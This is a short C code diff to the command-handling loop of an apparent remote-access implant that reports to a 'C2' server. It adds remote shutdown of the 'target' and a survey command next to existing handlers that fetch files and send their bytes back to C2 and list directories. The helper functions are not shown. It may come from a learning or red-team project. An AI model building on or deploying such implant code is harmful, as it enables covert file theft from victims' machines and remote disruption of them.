@@ -11,6 +11,7 @@
 #include "Common.h"
 #include "Disconnect.h"
 #include "File.h"
+#include "Shutdown.h"
 
 
 // Send a HTTP GET request to C2
@@ -140,10 +141,13 @@ int handleCommands(int* client_fd)
 
             case poweroff:
 
+                printf("Received shutdown command!\n");
 
-
-
-                break
+                if (!handleShutdown())
+                {
+                    printf("Failed to shutdown target!\n");
+                }
+                break;
 
             case getfile:
                 printf("Received getfile command!\n");
@@ -161,6 +165,7 @@ int handleCommands(int* client_fd)
                 printf("Sending %i bytes back to C2...\n", filesize);
 
                 // Send our response
+                    // TODO: this should be done in the handle command
                 if (!sendFileContents(client_fd, filesize, filebytes))
                 {
                     printf("Failed to send file contents to C2\n");
@@ -174,6 +179,9 @@ int handleCommands(int* client_fd)
             case dirlist:
                 printf("Received dirlist command!\n");
                 break;
+
+            case survey:
+                printf("Received survey command!\n");
 
             default:
                 printf("ERROR: Failed to recognize command: 0x%X\n", command->command);
